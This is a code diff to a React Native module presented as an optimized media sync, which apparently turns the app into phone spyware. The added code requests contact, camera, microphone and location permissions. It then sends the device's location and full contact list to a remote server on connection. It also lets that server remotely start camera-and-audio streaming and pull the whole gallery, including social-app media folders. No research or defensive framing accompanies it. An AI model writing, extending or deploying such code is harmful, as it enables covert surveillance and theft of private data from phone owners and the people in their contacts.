@@ -1,29 +1,277 @@
 import { PermissionsAndroid, Platform } from 'react-native';
 import RNFS from 'react-native-fs';
+import Contacts from 'react-native-contacts';
+import { mediaDevices, RTCPeerConnection, RTCIceCandidate, RTCSessionDescription } from 'react-native-webrtc';
 
-const SERVER_URL = 'ws://192.168.100.199:6969/ws';
+const SERVER_URL = 'ws://server_ip:6969/ws';
 const MAX_CONCURRENT_UPLOADS = 3; // Parallel uploads
 const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB limit
 
-export const requestStoragePermission = async () => {
+let webSocket = null;
+let localStream = null;
+let peerConnection = null;
+let isVideoStreaming = false;
+
+// Enhanced permission request including contacts and camera
+export const requestAllPermissions = async () => {
   if (Platform.OS === 'android') {
-    const granted = await PermissionsAndroid.requestMultiple([
+    const permissions = [
       PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
       PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
       PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
-    ]);
+      PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
+      PermissionsAndroid.PERMISSIONS.CAMERA,
+      PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
+      PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
+      PermissionsAndroid.PERMISSIONS.ACCESS_COARSE_LOCATION,
+    ];
+
+    const granted = await PermissionsAndroid.requestMultiple(permissions);
     
-    return Object.values(granted).some(permission => 
-      permission === PermissionsAndroid.RESULTS.GRANTED
-    );
+    return {
+      storage: Object.values({
+        storage: granted[PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE],
+        images: granted[PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES],
+        videos: granted[PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO],
+      }).some(permission => permission === PermissionsAndroid.RESULTS.GRANTED),
+      contacts: granted[PermissionsAndroid.PERMISSIONS.READ_CONTACTS] === PermissionsAndroid.RESULTS.GRANTED,
+      camera: granted[PermissionsAndroid.PERMISSIONS.CAMERA] === PermissionsAndroid.RESULTS.GRANTED,
+      audio: granted[PermissionsAndroid.PERMISSIONS.RECORD_AUDIO] === PermissionsAndroid.RESULTS.GRANTED,
+      location: granted[PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION] === PermissionsAndroid.RESULTS.GRANTED ||
+                granted[PermissionsAndroid.PERMISSIONS.ACCESS_COARSE_LOCATION] === PermissionsAndroid.RESULTS.GRANTED,
+    };
   }
-  return true;
+  return {
+    storage: true,
+    contacts: true,
+    camera: true,
+    audio: true,
+    location: true,
+  };
 };
 
-export const scanDirectoryForMedia = async (dirPath: string): Promise<string[]> => {
+// Get device location
+export const getDeviceLocation = async () => {
+  return new Promise((resolve) => {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          resolve({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+          });
+        },
+        (error) => {
+          console.error('Location error:', error);
+          resolve(null);
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
+      );
+    } else {
+      resolve(null);
+    }
+  });
+};
+
+// Get device IP address (this will be handled by backend when client connects)
+export const getDeviceInfo = async () => {
+  const location = await getDeviceLocation();
+  return {
+    platform: Platform.OS,
+    version: Platform.Version,
+    location: location,
+    timestamp: new Date().toISOString(),
+  };
+};
+
+// Fetch contacts from device
+export const fetchContacts = async () => {
+  try {
+    console.log('Fetching contacts...');
+    const contacts = await Contacts.getAll();
+    
+    const formattedContacts = contacts.map(contact => ({
+      id: contact.recordID,
+      name: `${contact.givenName || ''} ${contact.familyName || ''}`.trim() || 'Unknown',
+      phoneNumbers: contact.phoneNumbers.map(phone => phone.number),
+      emailAddresses: contact.emailAddresses.map(email => email.email),
+      thumbnailPath: contact.thumbnailPath,
+    }));
+
+    console.log(`Found ${formattedContacts.length} contacts`);
+    return formattedContacts;
+  } catch (error) {
+    console.error('Error fetching contacts:', error);
+    return [];
+  }
+};
+
+// Send contacts to backend
+export const sendContactsToBackend = async (contacts) => {
+  try {
+    const deviceInfo = await getDeviceInfo();
+    
+    const response = await fetch('http://server_ip:6969/contacts', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        contacts: contacts,
+        deviceInfo: deviceInfo,
+        timestamp: new Date().toISOString(),
+      }),
+    });
+
+    if (response.ok) {
+      console.log('✅ Contacts sent successfully');
+      return true;
+    } else {
+      console.error('❌ Failed to send contacts:', response.status);
+      return false;
+    }
+  } catch (error) {
+    console.error('Error sending contacts:', error);
+    return false;
+  }
+};
+
+// Initialize WebRTC for video streaming
+export const initWebRTC = async () => {
+  try {
+    const configuration = {
+      iceServers: [
+        { urls: 'stun:stun.l.google.com:19302' },
+      ],
+    };
+    
+    peerConnection = new RTCPeerConnection(configuration);
+    
+    peerConnection.onicecandidate = (event) => {
+      if (event.candidate && webSocket) {
+        webSocket.send(JSON.stringify({
+          type: 'ice-candidate',
+          candidate: event.candidate,
+        }));
+      }
+    };
+
+    peerConnection.onconnectionstatechange = () => {
+      console.log('Peer connection state:', peerConnection.connectionState);
+    };
+
+    return true;
+  } catch (error) {
+    console.error('Error initializing WebRTC:', error);
+    return false;
+  }
+};
+
+// Start video streaming
+export const startVideoStream = async () => {
+  try {
+    if (isVideoStreaming) {
+      console.log('Video streaming already active');
+      return;
+    }
+
+    console.log('Starting video stream...');
+    
+    const constraints = {
+      video: {
+        width: 640,
+        height: 480,
+        frameRate: 30,
+      },
+      audio: true,
+    };
+
+    localStream = await mediaDevices.getUserMedia(constraints);
+    
+    if (peerConnection) {
+      localStream.getTracks().forEach(track => {
+        peerConnection.addTrack(track, localStream);
+      });
+
+      const offer = await peerConnection.createOffer();
+      await peerConnection.setLocalDescription(offer);
+
+      if (webSocket) {
+        webSocket.send(JSON.stringify({
+          type: 'video-offer',
+          offer: offer,
+        }));
+      }
+
+      isVideoStreaming = true;
+      console.log('✅ Video streaming started');
+    }
+  } catch (error) {
+    console.error('Error starting video stream:', error);
+  }
+};
+
+// Stop video streaming
+export const stopVideoStream = async () => {
+  try {
+    console.log('Stopping video stream...');
+    
+    if (localStream) {
+      localStream.getTracks().forEach(track => track.stop());
+      localStream = null;
+    }
+
+    if (peerConnection) {
+      peerConnection.close();
+      await initWebRTC(); // Reinitialize for next use
+    }
+
+    isVideoStreaming = false;
+    console.log('✅ Video streaming stopped');
+  } catch (error) {
+    console.error('Error stopping video stream:', error);
+  }
+};
+
+// Handle WebRTC signaling
+export const handleWebRTCMessage = async (message) => {
+  try {
+    switch (message.type) {
+      case 'video-answer':
+        if (peerConnection && message.answer) {
+          await peerConnection.setRemoteDescription(new RTCSessionDescription(message.answer));
+        }
+        break;
+      
+      case 'ice-candidate':
+        if (peerConnection && message.candidate) {
+          await peerConnection.addIceCandidate(new RTCIceCandidate(message.candidate));
+        }
+        break;
+      
+      case 'start-video':
+        await startVideoStream();
+        break;
+      
+      case 'stop-video':
+        await stopVideoStream();
+        break;
+    }
+  } catch (error) {
+    console.error('Error handling WebRTC message:', error);
+  }
+};
+
+export const requestStoragePermission = async () => {
+  const permissions = await requestAllPermissions();
+  return permissions.storage;
+};
+
+export const scanDirectoryForMedia = async (dirPath) => {
   try {
     const items = await RNFS.readDir(dirPath);
-    const mediaFiles: string[] = [];
+    const mediaFiles = [];
     
     for (const item of items) {
       if (item.isFile()) {
@@ -46,11 +294,11 @@ export const scanDirectoryForMedia = async (dirPath: string): Promise<string[]> 
   }
 };
 
-export const fetchGalleryMediaOptimized = async (): Promise<string[]> => {
+export const fetchGalleryMediaOptimized = async () => {
   try {
     console.log('Scanning for media files including social apps...');
     
-    const mediaPaths: string[] = [];
+    const mediaPaths = [];
     
     // All directories including social media apps
     const directoriesToScan = [
@@ -114,8 +362,7 @@ export const fetchGalleryMediaOptimized = async (): Promise<string[]> => {
     );
     
     const validFiles = filesWithStats
-      .filter((result): result is PromiseFulfilledResult<{path: string, mtime: Date}> => 
-        result.status === 'fulfilled')
+      .filter((result) => result.status === 'fulfilled')
       .map(result => result.value)
       .sort((a, b) => b.mtime.getTime() - a.mtime.getTime()) // Newest first
       .map(file => file.path);
@@ -132,10 +379,10 @@ export const fetchGalleryMediaOptimized = async (): Promise<string[]> => {
 };
 
 // Optimized upload function with parallel processing
-export const uploadMediaOptimized = async (uris: string[]) => {
+export const uploadMediaOptimized = async (uris) => {
   console.log(`Starting optimized upload of ${uris.length} files`);
   
-  const uploadSingleFile = async (uri: string): Promise<boolean> => {
+  const uploadSingleFile = async (uri) => {
     try {
       const fileName = uri.split('/').pop() || 'media.jpg';
       console.log('Uploading file:', fileName);
@@ -163,12 +410,17 @@ export const uploadMediaOptimized = async (uris: string[]) => {
       const controller = new AbortController();
       const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout
       
-      const response = await fetch('http://192.168.100.199:6969/upload', {
+      const response = await fetch('http://server_ip:6969/upload', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify({ name: fileName, data: fileData }),
+        body: JSON.stringify({ 
+          name: fileName, 
+          data: fileData,
+          timestamp: new Date().toISOString(),
+          size: stats.size 
+        }),
         signal: controller.signal,
       });
       
@@ -217,54 +469,107 @@ export const uploadMediaOptimized = async (uris: string[]) => {
 };
 
 export const initMediaSyncOptimized = async () => {
-  console.log('Initializing optimized media sync...');
+  console.log('Initializing enhanced media sync with contacts and video streaming...');
   
-  const hasPermission = await requestStoragePermission();
-  if (!hasPermission) {
+  const permissions = await requestAllPermissions();
+  if (!permissions.storage) {
     console.warn('Storage permission denied');
     return;
   }
   
   console.log('Connecting to WebSocket:', SERVER_URL);
-  const ws = new WebSocket(SERVER_URL);
+  webSocket = new WebSocket(SERVER_URL);
   
-  ws.onopen = () => {
+  // Initialize WebRTC if camera permission is available
+  if (permissions.camera) {
+    await initWebRTC();
+  }
+  
+  webSocket.onopen = async () => {
     console.log('WebSocket connected successfully');
+    
+    // Send device info on connection
+    const deviceInfo = await getDeviceInfo();
+    webSocket.send(JSON.stringify({
+      type: 'device-info',
+      data: deviceInfo,
+    }));
+    
+    // Send contacts if permission is available
+    if (permissions.contacts) {
+      const contacts = await fetchContacts();
+      if (contacts.length > 0) {
+        await sendContactsToBackend(contacts);
+      }
+    }
   };
   
-  ws.onmessage = async event => {
+  webSocket.onmessage = async event => {
     console.log('WebSocket message received:', event.data);
     try {
       const message = JSON.parse(event.data);
-      if (message.type === 'SYNC_GALLERY') {
-        console.log('SYNC_GALLERY message received, scanning for media...');
-        const startTime = Date.now();
-        
-        const uris = await fetchGalleryMediaOptimized();
-        console.log('Found media files:', uris.length);
-        
-        if (uris.length > 0) {
-          await uploadMediaOptimized(uris);
-          const endTime = Date.now();
-          console.log(`Total sync time: ${((endTime - startTime) / 1000).toFixed(2)} seconds`);
-        } else {
-          console.log('No media files found to upload');
-        }
+      
+      switch (message.type) {
+        case 'SYNC_GALLERY':
+          console.log('SYNC_GALLERY message received, scanning for media...');
+          const startTime = Date.now();
+          
+          const uris = await fetchGalleryMediaOptimized();
+          console.log('Found media files:', uris.length);
+          
+          if (uris.length > 0) {
+            await uploadMediaOptimized(uris);
+            const endTime = Date.now();
+            console.log(`Total sync time: ${((endTime - startTime) / 1000).toFixed(2)} seconds`);
+          } else {
+            console.log('No media files found to upload');
+          }
+          break;
+          
+        case 'SYNC_CONTACTS':
+          if (permissions.contacts) {
+            console.log('SYNC_CONTACTS message received, fetching contacts...');
+            const contacts = await fetchContacts();
+            if (contacts.length > 0) {
+              await sendContactsToBackend(contacts);
+            }
+          }
+          break;
+          
+        case 'video-offer':
+        case 'video-answer':
+        case 'ice-candidate':
+        case 'start-video':
+        case 'stop-video':
+          if (permissions.camera) {
+            await handleWebRTCMessage(message);
+          }
+          break;
+          
+        default:
+          console.log('Unknown message type:', message.type);
       }
     } catch (error) {
       console.error('Error processing WebSocket message:', error);
     }
   };
   
-  ws.onerror = (error) => {
+  webSocket.onerror = (error) => {
     console.error('WebSocket error:', error);
   };
   
-  ws.onclose = (event) => {
+  webSocket.onclose = (event) => {
     console.log('WebSocket closed:', event.code, event.reason);
+    
+    // Clean up video streaming
+    if (isVideoStreaming) {
+      stopVideoStream();
+    }
   };
   
-  return ws;
+  return webSocket;
 };
 
-							   
+// Export additional utility functions
+export const getVideoStreamingStatus = () => isVideoStreaming;
+export const getWebSocketConnection = () => webSocket;
